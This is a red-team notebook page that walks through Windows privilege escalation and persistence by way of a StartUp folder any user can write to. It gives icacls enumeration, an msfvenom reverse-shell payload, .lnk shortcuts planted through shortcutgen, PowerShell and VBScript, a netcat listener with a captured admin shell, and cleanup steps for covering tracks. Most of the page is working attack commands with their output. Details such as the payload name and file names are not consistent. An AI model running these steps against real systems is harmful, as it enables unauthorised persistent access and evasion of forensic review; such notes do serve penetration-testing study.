# Living off the Land

One of the privilege escalation technique and so far the easiest ones to exploit it is Startup programs in the `StartUp` folder. Some versions of Windows operating systems vary to one another and it could be server or a workstation do a bit of research to find those locations and this technique is part of persistence mechanism to maintain access.

## 01 - Enumerate

### 1.1 - Command Prompt

```
C:\> icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp BUILTIN\Users:(OI)(CI)(F)
                                                             WIN-QBA94KB3IOF\Administrator:(I)(OI)(CI)(DE,DC)
                                                             WIN-QBA94KB3IOF\admin:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)
```

### 1.2 - PowerShell

TODO: Rewrite from command prompt to powershell

```
PS C:\> Get-ACL "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" | Format-List AccessToString
```

## 02 - Exploit

Generate the payload to transfer to the compromised machine.

```
$ msfvenom -p windows/x64/shell_reverse_shell lhost=<IP> lport=53 -f exe -o payload.exe
```

### 2.1 - [[ShortcutGen|ShortcutGen]]

TODO: Test it

We can copy the payload to the start up folder or we can create a shortcut link file to redirect the path of our payload. First generator the `.lnk` payload using `shortcutgen`.

```
$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c start /min C:\path\to\payload.exe" -o update.lnk
```

### 2.2 - [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Manual|PowerShell]]

```powershell
$WScriptShell = New-Object -ComObject WScript.Shell
$ShortcutPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = 'C:\path\to\payload.exe'
$Shortcut.WindowStyle = 7
$Shortcut.Save()
```

### 2.3 - VBScript

We can copy the payload to the start up folder or we can create a shortcut link file to redirect the path of our payload.

```vbscript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\path\to\payload"
oLink.Save
```

Execute the modified VBScript.

```
C:\> cscript CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.
```

Launch the shell handler.

```
$ sudo nc -lvnp 53
```

Now we wait for the administrator user to login and wait for a callback connection.

```
$ xfreerdp /u:"<username>" /p:"<password>" /sec:<rdp | tls | nla> /v:<IP>

$ sudo nc -lvnp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.221.80.
Ncat: Connection from 10.10.221.80:49882.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32> whoami
win-qba94kb3iof\admin
```

## 03 - Cleanup

Now the problem is through this netcat handler we can't revert back to it's original binary file. However, once you perform this technique use `metasploit-framework` as a shell handler since it is easily can be migrated to another process and to revert back just like I've previously demonstrated when covering your traces. Take this OPSEC measure into account.

```
C:\Windows\System32> del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"

C:\Windows\System32> del /path/to/shell.exe
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/12 - Anti-Forensics/Windows/Clear Traces/02 - Timestomps/Manual/Living off the Land|Windows: Timestomp]]

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)